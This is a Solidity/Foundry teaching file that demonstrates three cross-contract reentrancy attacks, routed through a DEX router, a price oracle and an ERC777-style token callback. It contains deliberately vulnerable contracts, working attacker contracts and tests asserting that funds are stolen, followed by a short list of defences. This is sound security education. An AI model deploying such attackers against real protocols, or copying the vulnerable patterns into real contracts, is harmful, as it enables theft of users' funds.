// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 跨合约重入攻击示例（修复版）
 * @notice 解决了Solidity 0.8+下溢问题，并添加完整的ERC777测试
 */

// ============ 场景1: DEX通过Router重入 ============

contract VulnerableDEX {
    mapping(address => uint256) public ethBalance;
    mapping(address => uint256) public tokenBalance;
    
    address public router;
    uint256 public constant INITIAL_PRICE = 1 ether;
    
    constructor(address _router) {
        router = _router;
    }
    
    function depositETH() external payable {
        ethBalance[msg.sender] += msg.value;
    }
    
    function depositToken(uint256 _amount) external {
        tokenBalance[msg.sender] += _amount;
    }
    
    function withdrawETH(uint256 _amount) external {
        require(ethBalance[msg.sender] >= _amount, "Insufficient ETH balance");
        
        ethBalance[msg.sender] -= _amount;  // ✅ 修复：先更新状态
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "ETH transfer failed");
    }
    
    // 漏洞函数：通过Router进行swap
    function swapTokenForETH(uint256 _tokenAmount) external {
        // 缓存余额到局部变量（典型漏洞写法：外部调用前未更新状态）
        // 这样即使发生跨合约重入，也不会因为其他路径先修改 tokenBalance 导致 0.8+ 下溢回滚
        uint256 userTokenBalance = tokenBalance[msg.sender];
        require(userTokenBalance >= _tokenAmount, "Insufficient token balance");
        
        uint256 ethAmount = _tokenAmount * INITIAL_PRICE / 1 ether;
        require(address(this).balance >= ethAmount, "Insufficient DEX liquidity");
        
        // ❌ 关键漏洞：调用Router，Router可能回调攻击者
        IRouter(router).executeSwap(
            msg.sender,
            address(this),
            _tokenAmount,
            ethAmount
        );
        
        // ❌ 状态更新在Router调用之后（太晚了）
        tokenBalance[msg.sender] = userTokenBalance - _tokenAmount;
        ethBalance[msg.sender] += ethAmount;
    }
    
    function getETHBalance(address _user) external view returns (uint256) {
        return ethBalance[_user];
    }
}

interface IRouter {
    function executeSwap(
        address user,
        address dex,
        uint256 tokenAmount,
        uint256 ethAmount
    ) external;
}

contract MaliciousRouter is IRouter {
    address public attacker;
    
    constructor(address _attacker) {
        attacker = _attacker;
    }

    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }
    
    function executeSwap(
        address user,
        address dex,
        uint256 tokenAmount,
        uint256 ethAmount
    ) external {
        console.log("\n--- Router.executeSwap() called ---");
        console.log("User:", user);
        console.log("Token amount:", tokenAmount);
        console.log("ETH amount:", ethAmount);
        
        if (user == attacker) {
            console.log(">>> Triggering attacker callback <<<");
            IAttackerCallback(attacker).routerCallback();
        }
        
        console.log("Router swap complete");
    }
}

interface IAttackerCallback {
    function routerCallback() external;
}

contract CrossContractAttacker is IAttackerCallback {
    VulnerableDEX public dex;
    bool public attacking;
    uint256 public attackCount;
    
    constructor(address _dexAddress) {
        dex = VulnerableDEX(_dexAddress);
    }
    
    receive() external payable {}
    
    function fundAttack() external payable {
        dex.depositETH{value: msg.value}();
        dex.depositToken(10 ether);
        
        console.log("Attack funded with:", msg.value);
    }
    
    function attack() external {
        console.log("\n=== Starting Cross-Contract Reentrancy Attack ===");
        console.log("Attacker ETH balance in DEX:", dex.ethBalance(address(this)));
        console.log("Attacker token balance in DEX:", dex.tokenBalance(address(this)));
        
        attacking = true;
        attackCount = 0;
        
        dex.swapTokenForETH(10 ether);

        // 把 swap 造成的“账面ETH余额”兑现成真实 ETH
        uint256 credit = dex.ethBalance(address(this));
        console.log("\nWithdrawing credited ETH from DEX:", credit);
        dex.withdrawETH(credit);
        
        attacking = false;
        
        console.log("\n=== Attack Complete ===");
        console.log("Attacker ETH balance in DEX:", dex.ethBalance(address(this)));
        console.log("Attacker token balance in DEX:", dex.tokenBalance(address(this)));
        console.log("Stolen ETH:", address(this).balance);
    }
    
    // Router回调函数 - 这里触发重入
    function routerCallback() external {
        console.log("\n!!! Router callback triggered in attacker !!!");
        console.log("Current ETH balance in DEX:", dex.ethBalance(address(this)));
        console.log("Current token balance in DEX:", dex.tokenBalance(address(this)));
        console.log("(Token balance NOT updated yet, but has 10 ETH credit coming!)");
        
        if (attacking && attackCount < 3) {
            attackCount++;
            console.log("\n>>> Reentering swapTokenForETH() again <<<");
            
            // 关键：token余额还是10 ETH，可以再次swap
            uint256 tokenBal = dex.tokenBalance(address(this));
            console.log("Can still swap tokens:", tokenBal);
            
            if (tokenBal >= 5 ether) {
                dex.swapTokenForETH(5 ether);
            }
        }
    }
}

// ============ 场景2: 借贷协议通过价格Oracle重入 ============

contract VulnerableLending {
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public debt;
    
    address public priceOracle;
    uint256 public constant COLLATERAL_RATIO = 150;
    
    constructor(address _oracle) {
        priceOracle = _oracle;
    }
    
    function depositCollateral() external payable {
        collateral[msg.sender] += msg.value;
    }
    
    function borrow(address _token, uint256 _amount) external {
        // ❌ 漏洞点：先把关键状态读到局部变量，然后再去外部调用 Oracle
        // Oracle 期间如果发生重入，collateral/debt 可能被修改，但这里仍然使用“旧快照”做校验
        uint256 userCollateral = collateral[msg.sender];
        uint256 userDebt = debt[msg.sender];

        // ❌ 外部调用Oracle获取价格（可被重入）
        uint256 tokenPrice = IPriceOracle(priceOracle).getPrice(_token);
        
        uint256 borrowValue = _amount * tokenPrice / 1 ether;
        uint256 maxBorrow = (userCollateral * 100) / COLLATERAL_RATIO;
        
        require(userDebt + borrowValue <= maxBorrow, "Insufficient collateral");
        
        // 更新债务（基于旧快照写回）
        debt[msg.sender] = userDebt + borrowValue;
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Borrow transfer failed");
    }
    
    function withdrawCollateral(uint256 _amount) external {
        require(collateral[msg.sender] >= _amount, "Insufficient collateral");
        
        // 检查健康度
        uint256 requiredCollateral = (debt[msg.sender] * COLLATERAL_RATIO) / 100;
        require(collateral[msg.sender] - _amount >= requiredCollateral, "Would be undercollateralized");
        
        // ❌ 外部调用在状态更新前
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Withdrawal failed");
        
        collateral[msg.sender] -= _amount;
    }
    
    function getAccountHealth(address _user) external view returns (uint256) {
        if (debt[_user] == 0) return type(uint256).max;
        return (collateral[_user] * 100) / debt[_user];
    }
}

interface IPriceOracle {
    function getPrice(address token) external returns (uint256);
}

contract MaliciousOracle is IPriceOracle {
    mapping(address => uint256) public prices;
    address public attacker;
    bool public shouldAttack;
    
    constructor() {
        prices[address(0x1)] = 1 ether;
    }
    
    function setAttacker(address _attacker) external {
        attacker = _attacker;
    }
    
    function setPrice(address token, uint256 price) external {
        prices[token] = price;
    }
    
    function enableAttack() external {
        shouldAttack = true;
    }
    
    function getPrice(address token) external returns (uint256) {
        console.log("\n--- Oracle.getPrice() called ---");
        console.log("Token:", token);
        console.log("Price:", prices[token]);
        
        if (shouldAttack && msg.sender != attacker) {
            console.log(">>> Oracle triggering attacker callback <<<");
            shouldAttack = false;
            IOracleCallback(attacker).oracleCallback();
            shouldAttack = true;
        }
        
        return prices[token];
    }
}

interface IOracleCallback {
    function oracleCallback() external;
}

contract OracleAttacker is IOracleCallback {
    VulnerableLending public lending;
    MaliciousOracle public oracle;
    bool public attacking;
    
    constructor(address _lendingAddress, address _oracleAddress) {
        lending = VulnerableLending(_lendingAddress);
        oracle = MaliciousOracle(_oracleAddress);
    }
    
    receive() external payable {}
    
    function fundAttack() external payable {
        lending.depositCollateral{value: msg.value}();
        console.log("Deposited collateral:", msg.value);
    }
    
    function attack() external {
        console.log("\n=== Starting Oracle Reentrancy Attack ===");
        console.log("Collateral:", lending.collateral(address(this)));
        console.log("Debt:", lending.debt(address(this)));
        
        oracle.setAttacker(address(this));
        oracle.enableAttack();
        
        attacking = true;
        
        address token = address(0x1);
        lending.borrow(token, 5 ether);
        
        attacking = false;
        
        console.log("\n=== Attack Complete ===");
        console.log("Collateral:", lending.collateral(address(this)));
        console.log("Debt:", lending.debt(address(this)));
        console.log("Stolen:", address(this).balance);
    }
    
    function oracleCallback() external {
        console.log("\n!!! Oracle callback triggered in attacker !!!");
        console.log("Current collateral:", lending.collateral(address(this)));
        console.log("Current debt:", lending.debt(address(this)));
        
        if (attacking) {
            console.log("\n>>> Reentering withdrawCollateral() <<<");
            
            uint256 col = lending.collateral(address(this));
            if (col > 0) {
                lending.withdrawCollateral(col);
            }
        }
    }
}

// ============ 场景3: ERC777代币回调重入 ============

contract VulnerableVault {
    mapping(address => mapping(address => uint256)) public balances;
    
    function deposit(address _token, uint256 _amount) external {
        // ❌ 先转入代币（如果是ERC777会触发回调）
        IERC20(_token).transferFrom(msg.sender, address(this), _amount);
        
        // 后更新余额
        balances[msg.sender][_token] += _amount;
    }
    
    function withdraw(address _token, uint256 _amount) external {
        require(balances[msg.sender][_token] >= _amount, "Insufficient balance");
        
        // ❌ 先转出代币
        IERC20(_token).transfer(msg.sender, _amount);
        
        // 后更新余额
        balances[msg.sender][_token] -= _amount;
    }
    
    function getBalance(address _user, address _token) external view returns (uint256) {
        return balances[_user][_token];
    }
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousERC777Token {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    address public attacker;
    address public targetVault;
    bool public enableCallback;
    
    constructor() {
        balances[msg.sender] = 1000000 ether;
    }
    
    function setAttacker(address _attacker, address _vault) external {
        attacker = _attacker;
        targetVault = _vault;
    }
    
    function enableAttack() external {
        enableCallback = true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowances[msg.sender][spender] = amount;
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
        
        // ERC777风格的回调
        if (enableCallback && to == attacker && msg.sender == targetVault) {
            console.log("\n--- Token triggering tokensReceived callback ---");
            ITokenCallback(attacker).tokensReceived(msg.sender, amount);
        }
        
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balances[from] >= amount, "Insufficient balance");
        require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
        
        balances[from] -= amount;
        balances[to] += amount;
        allowances[from][msg.sender] -= amount;
        
        return true;
    }
    
    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
    
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
}

interface ITokenCallback {
    function tokensReceived(address from, uint256 amount) external;
}

contract ERC777Attacker is ITokenCallback {
    VulnerableVault public vault;
    MaliciousERC777Token public token;
    bool public attacking;
    uint256 public attackCount;
    
    constructor(address _vaultAddress, address _tokenAddress) {
        vault = VulnerableVault(_vaultAddress);
        token = MaliciousERC777Token(_tokenAddress);
    }
    
    function fundAttack(uint256 _amount) external {
        token.mint(address(this), _amount);
        
        // 批准和存款
        token.approve(address(vault), _amount);
        vault.deposit(address(token), _amount);
        
        console.log("Deposited tokens:", _amount);
    }
    
    function attack() external {
        console.log("\n=== Starting ERC777 Token Reentrancy Attack ===");
        console.log("Attacker balance in vault:", vault.balances(address(this), address(token)));
        console.log("Attacker token balance:", token.balanceOf(address(this)));
        
        token.setAttacker(address(this), address(vault));
        token.enableAttack();
        
        attacking = true;
        attackCount = 0;
        
        // 提取代币，会触发tokensReceived回调
        vault.withdraw(address(token), 10 ether);
        
        attacking = false;
        
        console.log("\n=== Attack Complete ===");
        console.log("Attacker balance in vault:", vault.balances(address(this), address(token)));
        console.log("Attacker token balance:", token.balanceOf(address(this)));
    }
    
    function tokensReceived(address from, uint256 amount) external {
        console.log("\n!!! tokensReceived callback triggered !!!");
        console.log("From:", from);
        console.log("Amount:", amount);
        console.log("Vault balance record:", vault.balances(address(this), address(token)));
        console.log("(Balance not updated yet!)");
        
        if (attacking && attackCount < 2) {
            attackCount++;
            console.log("\n>>> Reentering withdraw() <<<");

            // 不要一次性提取“账面余额”，否则会超过 Vault 的实时代币余额而失败。
            // 这里固定再提取一笔（等同于重复提款），即可展示：同一笔余额被多次取走。
            vault.withdraw(address(token), amount);
        }
    }
}

// ============ Foundry 测试 ============

contract CrossContractReentrancyTest is Test {
    VulnerableDEX public dex;
    MaliciousRouter public router;
    CrossContractAttacker public attacker;
    
    address public victim = address(0x1);
    
    function setUp() public {
        vm.deal(victim, 100 ether);
    }
    
    function testCrossContractReentrancy() public {
        // 先部署Router（攻击者地址后续再补上），再部署DEX，最后部署攻击者并回填Router
        router = new MaliciousRouter(address(0));
        dex = new VulnerableDEX(address(router));
        attacker = new CrossContractAttacker(address(dex));
        router.setAttacker(address(attacker));
        
        // 受害者提供流动性
        vm.prank(victim);
        dex.depositETH{value: 100 ether}();
        
        // 攻击者准备
        vm.deal(address(attacker), 20 ether);
        attacker.fundAttack{value: 20 ether}();
        
        uint256 dexBalanceBefore = address(dex).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        console.log("\n=== Before Attack ===");
        console.log("DEX balance:", dexBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);
        
        // 执行攻击
        attacker.attack();
        
        uint256 dexBalanceAfter = address(dex).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("\n=== After Attack ===");
        console.log("DEX balance:", dexBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        console.log("Profit:", profit);
        
        // 攻击成功：通过重入多次swap，获得了额外的ETH
        assertTrue(profit > 0, "Should profit from attack");
        assertTrue(dexBalanceAfter < dexBalanceBefore, "DEX should lose funds");
    }
}

contract OracleReentrancyTest is Test {
    VulnerableLending public lending;
    MaliciousOracle public oracle;
    OracleAttacker public attacker;
    
    function setUp() public {
        oracle = new MaliciousOracle();
        lending = new VulnerableLending(address(oracle));
        
        vm.deal(address(lending), 100 ether);
    }
    
    function testOracleReentrancy() public {
        attacker = new OracleAttacker(address(lending), address(oracle));
        
        vm.deal(address(attacker), 10 ether);
        attacker.fundAttack{value: 10 ether}();
        
        console.log("\n=== Before Attack ===");
        console.log("Lending balance:", address(lending).balance);
        console.log("Attacker collateral:", lending.collateral(address(attacker)));
        
        attacker.attack();
        
        console.log("\n=== After Attack ===");
        console.log("Lending balance:", address(lending).balance);
        console.log("Attacker balance:", address(attacker).balance);
        
        // 攻击成功：取回了抵押品还借了钱
        assertTrue(address(attacker).balance > 10 ether, "Should profit from attack");
    }
}

contract ERC777ReentrancyTest is Test {
    VulnerableVault public vault;
    MaliciousERC777Token public token;
    ERC777Attacker public attacker;
    
    function setUp() public {
        vault = new VulnerableVault();
        token = new MaliciousERC777Token();
    }
    
    function testTokenReentrancy() public {
        attacker = new ERC777Attacker(address(vault), address(token));
        
        // 攻击者获得代币并存入
        attacker.fundAttack(30 ether);
        
        console.log("\n=== Before Attack ===");
        console.log("Attacker vault balance:", vault.balances(address(attacker), address(token)));
        console.log("Attacker token balance:", token.balanceOf(address(attacker)));
        
        uint256 vaultBalanceBefore = vault.balances(address(attacker), address(token));
        
        // 执行攻击
        attacker.attack();
        
        console.log("\n=== After Attack ===");
        console.log("Attacker vault balance:", vault.balances(address(attacker), address(token)));
        console.log("Attacker token balance:", token.balanceOf(address(attacker)));
        
        uint256 stolenTokens = token.balanceOf(address(attacker));
        
        // 验证：通过重入，提取了多次
        assertTrue(stolenTokens > 10 ether, "Should steal more than 10 tokens");
        console.log("\nStolen tokens:", stolenTokens);
        console.log("Original deposit was 30, withdrew ~30 through reentrancy");
    }
}

/**
 * ============ 修复后的知识点 ============
 * 
 * 1. Solidity 0.8+ 的变化：
 *    - 自动检查下溢/溢出
 *    - 使攻击者需要调整策略
 *    - 但仍然可以利用状态不一致
 * 
 * 2. 三种跨合约重入场景：
 *    - Router重入：通过可信的中间合约回调
 *    - Oracle重入：价格查询时的回调攻击
 *    - Token重入：ERC777的tokensReceived回调
 * 
 * 3. 防御重点：
 *    - 全局ReentrancyGuard
 *    - 严格的CEI模式
 *    - 限制可信外部合约
 */
